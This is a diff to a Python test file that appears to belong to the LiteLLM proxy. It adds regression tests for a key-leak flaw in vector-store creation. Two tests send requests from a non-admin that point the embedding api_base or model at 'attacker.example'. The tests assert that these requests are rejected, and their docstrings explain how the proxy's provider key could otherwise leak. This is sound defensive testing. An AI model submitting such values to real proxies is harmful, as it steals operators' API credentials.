@@ -104,12 +104,19 @@ def test_router_vector_store_search_injects_executor_and_request_metadata():
     create_original = MagicMock(return_value="created")
     wrapped_create = router.factory_function(create_original, call_type="vector_store_create")
     assert wrapped_create(name="store") == "created"
-    create_original.assert_called_once_with(name="store")
+    create_call_kwargs = create_original.call_args.kwargs
+    assert create_call_kwargs["name"] == "store"
+    assert create_call_kwargs["router"] is router
+    create_executor = create_call_kwargs["_direct_vector_store_embedding_executor"]
+    assert isinstance(create_executor, RouterVectorStoreEmbeddingExecutor)
     with patch.object(  # test-quality-ok: fallback dispatch is the boundary this wrapper delegates to
         router, "_generic_api_call_with_fallbacks", return_value="created-through-router"
     ) as fallback:
         assert wrapped_create(model="vector-alias", name="store") == "created-through-router"
-    fallback.assert_called_once_with(original_function=create_original, model="vector-alias", name="store")
+    fallback_call_kwargs = fallback.call_args.kwargs
+    assert fallback_call_kwargs["original_function"] is create_original
+    assert fallback_call_kwargs["model"] == "vector-alias"
+    assert fallback_call_kwargs["name"] == "store"
 
 
 @pytest.mark.asyncio
@@ -159,16 +166,15 @@ async def test_vector_store_embedding_executors_preserve_explicit_configuration(
 
     explicit_embedding.assert_not_called()
     explicit_aembedding.assert_not_awaited()
+    # A routed call always uses the deployment's own key, never a caller-supplied override.
     assert mock_router.embedding.call_args.kwargs == {
         "model": "openai/model",
         "input": ["query"],
-        "api_key": "store-key",
         "metadata": {"user_api_key_team_id": "team-a"},
     }
     mock_router.aembedding.assert_awaited_once_with(
         model="openai/model",
         input=["query"],
-        api_key="store-key",
         metadata={"user_api_key_team_id": "team-a"},
     )
 
@@ -4335,6 +4341,68 @@ def test_vector_store_create_and_update_reject_endpoint_params_from_non_admins(p
 
     assert response.status_code == 403, response.json()
     assert param in str(response.json())
+
+
+def test_vector_store_create_rejects_litellm_embedding_config_from_non_admins():
+    """Regression (mongodb create-path key leak): only litellm_embedding_model was gated on create, so a
+    non-admin's litellm_embedding_config.api_base could still redirect the dimension probe's embedding
+    call to an attacker host with the proxy's own provider key."""
+    from fastapi.testclient import TestClient
+
+    from litellm.proxy.auth.user_api_key_auth import user_api_key_auth
+    from litellm.proxy.proxy_server import app
+
+    mock_auth = UserAPIKeyAuth(user_id="test_internal_user", user_role=LitellmUserRoles.INTERNAL_USER.value)
+    original_overrides = app.dependency_overrides.copy()
+    app.dependency_overrides[user_api_key_auth] = lambda: mock_auth
+    try:
+        response = TestClient(app).post(
+            "/v1/vector_stores",
+            json={
+                "name": "kb",
+                "custom_llm_provider": "mongodb",
+                "litellm_embedding_model": "openai/text-embedding-3-small",
+                "litellm_embedding_config": {"api_base": "https://attacker.example/v1"},
+                "mongodb_database": "d",
+                "mongodb_collection": "c",
+            },
+        )
+    finally:
+        app.dependency_overrides = original_overrides
+
+    assert response.status_code == 403, response.json()
+    assert "litellm_embedding_config" in str(response.json())
+
+
+def test_vector_store_create_rejects_an_embedding_model_the_router_does_not_serve():
+    """Regression (LIT-6750 follow-up / mongodb create-path key leak): the create path never checked its
+    embedding model against the router or the caller's key, so a non-admin's huggingface/<attacker host>
+    reached that host with the proxy's HUGGINGFACE_API_KEY during the dimension probe."""
+    from fastapi.testclient import TestClient
+
+    from litellm.proxy.auth.user_api_key_auth import user_api_key_auth
+    from litellm.proxy.proxy_server import app
+
+    mock_auth = UserAPIKeyAuth(user_id="test_internal_user", user_role=LitellmUserRoles.INTERNAL_USER.value)
+    original_overrides = app.dependency_overrides.copy()
+    app.dependency_overrides[user_api_key_auth] = lambda: mock_auth
+    try:
+        with patch("litellm.proxy.proxy_server.llm_router", _embedding_router()):
+            response = TestClient(app).post(
+                "/v1/vector_stores",
+                json={
+                    "name": "kb",
+                    "custom_llm_provider": "mongodb",
+                    "litellm_embedding_model": "huggingface/http://attacker.example/steal",
+                    "mongodb_database": "d",
+                    "mongodb_collection": "c",
+                },
+            )
+    finally:
+        app.dependency_overrides = original_overrides
+
+    assert response.status_code == 400, response.json()
+    assert "huggingface/http://attacker.example/steal" in str(response.json())
 
 
 def test_request_endpoint_check_ignores_filters_and_admins():
